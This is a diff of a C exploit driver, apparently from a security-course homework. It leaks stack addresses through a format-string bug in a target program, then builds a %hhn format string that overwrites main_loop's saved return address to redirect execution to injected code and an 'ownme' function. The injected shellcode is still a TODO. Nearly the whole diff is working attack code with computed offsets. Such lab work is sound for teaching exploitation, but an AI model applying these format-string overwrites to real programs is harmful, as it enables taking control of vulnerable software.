@@ -105,9 +105,14 @@ void create_subproc(const char* exec, char* argv[]) {
    }
 }
 
-/* Helper function to convert a two byte hex value to decimal */
+/* Convert a two byte hex value to decimal */
 int convert_hex(unsigned hex) {
    return (hex & 0xf) + (hex & 0xf0);
+}
+
+/* Round a number to the nearest multiple of 256 >= to it */
+int round_256(unsigned num) {
+   return 256 * ((num + 255) / 256);
 }
 
 /* Shows an example session with subprocess. Change it as you see fit, */
@@ -131,16 +136,16 @@ int main(int argc, char* argv[]) {
    getchar();
 
    // Values needed for attack
-   void *mainloop_bp = (void*) 0xbfffefe8;   // main_loop ebp
-   void *mainloop_ra = (void*) 0x804b652;    // main_loop saved eip (RA)
+   void *mainloop_ra = (void*) 0x804b652;    // main_loop saved eip
+   void *main_bp     = (void*) 0xbffff018;   // main_loop saved ebp
    void *ownme_addr  = (void*) 0x804b1dd;    // addr of ownme
    void *main_ra_loc = (void*) 0xbfffefec;   // main_loop ra location
    void *rdbuf_loc   = (void*) 0xbfffe860;   // address of rdbuf
 
    // Relative distances
-   unsigned mainloop_bp_ra_diff = main_ra_loc - mainloop_bp;
+   unsigned mainloop_bp_ra_diff = main_bp - main_ra_loc;
    unsigned mainloop_ownme_diff = mainloop_ra - ownme_addr;
-   unsigned mainloop_bp_rdbuff_diff = mainloop_bp - rdbuf_loc;
+   unsigned mainloop_bp_rdbuff_diff = main_bp - rdbuf_loc;
 
    // 634 the saved bp; 635 the return address.
    put_str("e %634$x %635$x\n");
@@ -153,7 +158,7 @@ int main(int argc, char* argv[]) {
    fprintf(stderr, "mainloop ra: %x, mainloop bp: %x\n", cur_mainloop_ra, cur_mainloop_bp);
 
    // Calculate main_loop ra location
-   unsigned cur_mainloop_ra_loc = cur_mainloop_bp + mainloop_bp_ra_diff;
+   unsigned cur_mainloop_ra_loc = cur_mainloop_bp - mainloop_bp_ra_diff;
    fprintf(stderr, "current ra location: %x\n", cur_mainloop_ra_loc);
 
    // Actual ownme address
@@ -166,37 +171,61 @@ int main(int argc, char* argv[]) {
 
    // Address of injected code in exploit buffer
    unsigned code_addr = cur_rdbuf_addr + 256;
+   fprintf(stderr, "code addr: %x\n", code_addr);
 
    // Initialize exploit buffer
    // 128 bytes for each "section" (attack_format, params, injected code)
-   char exploit[128 * 3];
-   memset(exploit, '\0', sizeof(exploit));
+   unsigned explsz = 128 * 3;
+   void** exploit = (void**)malloc(explsz);
+   memset((void*)exploit, '\0', explsz);
 
-   // Populate "attack_format" part of exploit buffer
    // NOTE: Offset, in words, from printf's stack frame to the first byte in 
    // rdbuf is 152 (determined using GDB + trial and error). This means that
-   // the offset to the "params" part of the exploit string is 152 + 128 = 280
+   // the offset to the "params" part of the exploit string is 152 + 128/4 = 184
    char attack_format[] =
-      "%%256d%%%dd%%280$hhn" // write first byte to addr at offset 280
-      "%%256d%%%dd%%281$hhn" // write second byte to addr at offset 281
-      "%%256d%%%dd%%282$hhn" // ...
-      "%%256d%%%dd%%283$hhn" // write last byte to addr at 283
+      "e "                             // start echo command
+      "%%184$%dd%%185$%dd%%186$hhn"   // write first byte to addr at offset 186
+      "%%187$%dd%%188$%dd%%189$hhn"    // write second byte to addr at offset 189
+      "%%190$%dd%%191$%dd%%192$hhn"    // write third byte to addr at offset 192
+      "%%193$%dd%%194$%dd%%195$hhn"    // write last byte to addr at offset 195
+      "\n"                             // end echo command
    ;
 
-   sprintf(exploit, attack_format, convert_hex(code_addr), 
-           convert_hex(code_addr >> 8), convert_hex(code_addr >> 16),
-           convert_hex(code_addr >> 24));
+   // Set Ci/Bi as defined in the homework solution
+   unsigned printed = 0;
+   
+   unsigned c1 = 256;
+   unsigned b1 = convert_hex(code_addr);
+   printed += c1 + b1;
+   
+   unsigned c2 = round_256(printed) - printed;
+   unsigned b2 = convert_hex(code_addr >> 8);
+   printed += c2 + b2;
 
-   // Populate "params" part of exploit string
-   // 128 from base of exploit = 280 from printf's stack frame
-   *(unsigned*)(exploit + 128) = cur_mainloop_ra_loc;
-   *(unsigned*)(exploit + 132) = cur_mainloop_ra_loc + 1;
-   *(unsigned*)(exploit + 136) = cur_mainloop_ra_loc + 2;
-   *(unsigned*)(exploit + 140) = cur_mainloop_ra_loc + 3;
+   unsigned c3 = round_256(printed) - printed;
+   unsigned b3 = convert_hex(code_addr >> 16);
+   printed += c3 + b3;
 
-   put_str("e ");
-   put_bin(exploit, 4);
-   put_str("\n");
+   unsigned c4 = round_256(printed) - printed;
+   unsigned b4 = convert_hex(code_addr >> 24);
+
+   // Populate "attack_format" part of exploit buffer
+   sprintf((char*)exploit, attack_format, c1, b1, c2, b2, c3, b3, c4, b4);
+
+   // Populate "params" part of exploit string (128 bytes exploit = 184 words from printf's frame)
+   exploit[138/sizeof(void*)] = (void*) cur_mainloop_ra_loc;
+   exploit[150/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 1;
+   exploit[162/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 2;
+   exploit[174/sizeof(void*)] = (void*) cur_mainloop_ra_loc + 3;
+
+   put_bin((void*)exploit, explsz);
+   send();
+
+   // TODO: INJECT CODE TO CALL OWNME AT OFFSET 256 IN EXPLOIT BUFFER
+   // MAIN_LOOP'S RA IS ALREADY BEING SET TO POINT TO THIS LOCATION
+
+   // Quit so main returns to our injected code
+   put_str("q\n");
    send();
 
    usleep(100000);
